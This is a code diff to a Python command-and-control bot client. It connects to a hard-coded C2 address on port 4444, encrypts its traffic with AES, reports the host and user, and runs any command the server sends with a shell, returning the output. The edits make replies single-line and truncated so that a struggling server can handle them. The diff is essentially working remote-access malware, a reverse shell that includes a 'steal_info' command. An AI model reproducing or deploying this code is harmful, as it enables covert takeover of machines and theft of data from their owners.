@@ -4,7 +4,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
 # ============ CHANGE THIS ============
-C2_IP   = "192.168.91.128"     # Your C2 IP from screenshot
+C2_IP   = "192.168.91.128"
 C2_PORT = 4444
 # =====================================
 
@@ -24,7 +24,10 @@ def decrypt(data):
 def run_cmd(cmd):
     try:
         r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
-        return (r.stdout + r.stderr).strip() or "[no output]"
+        out = (r.stdout + r.stderr).strip()
+        # Make multi-line output single-line friendly for the broken server
+        out = out.replace("\n", " | ")
+        return out or "[no output]"
     except Exception as e:
         return f"Error: {e}"
 
@@ -46,8 +49,11 @@ def send(data):
     try:
         if not isinstance(data, str):
             data = json.dumps(data)
+        # Keep replies short so the original server doesn't break
+        if len(data) > 800:
+            data = data[:800] + " ...[truncated]"
         connection.send(encrypt(data))
-        print(f"[>] Sent: {data[:80]}...")
+        print(f"[>] Sent: {data[:100]}")
     except Exception as e:
         print(f"[-] Send error: {e}")
         connect()
@@ -62,14 +68,13 @@ def receive():
             buf += chunk
             try:
                 plain = decrypt(buf).decode()
-                print(f"[<] Received raw: {plain[:100]}")
-                # Try to parse as JSON, otherwise return as string
+                print(f"[<] Received: {plain}")
                 try:
                     return json.loads(plain)
                 except:
                     return plain
             except:
-                continue  # need more data
+                continue
         except Exception as e:
             print(f"[-] Receive error: {e}")
             connect()
@@ -77,13 +82,7 @@ def receive():
 
 def main():
     connect()
-    # Send hello / system info
-    info = {
-        "hostname": platform.node(),
-        "user": os.getenv("USER", "unknown"),
-        "platform": platform.system(),
-        "ip": C2_IP
-    }
+    info = f"Linux bot | user={os.getenv('USER')} | host={platform.node()}"
     send(info)
 
     while True:
@@ -91,14 +90,13 @@ def main():
         if cmd is None:
             continue
 
-        print(f"[*] Command: {cmd}")
+        print(f"[*] Executing: {cmd}")
 
         if isinstance(cmd, dict):
-            # some servers send dicts
-            cmd = cmd.get("command") or cmd.get("cmd") or str(cmd)
+            cmd = str(cmd)
 
         if cmd in ["exit", "quit"]:
-            send("Bye")
+            send("Client exiting")
             break
         elif cmd in ["info", "steal_info", "sysinfo"]:
             send(info)
@@ -107,14 +105,13 @@ def main():
         elif cmd.startswith("cd "):
             try:
                 os.chdir(cmd[3:].strip())
-                send(f"OK: {os.getcwd()}")
+                send(f"Changed to {os.getcwd()}")
             except Exception as e:
                 send(str(e))
         else:
-            # Execute any other command
             result = run_cmd(cmd)
             send(result)
 
 if __name__ == "__main__":
-    print("[*] Starting robust Linux client...")
+    print("[*] Starting fixed Linux client (single-line replies)...")
     main()
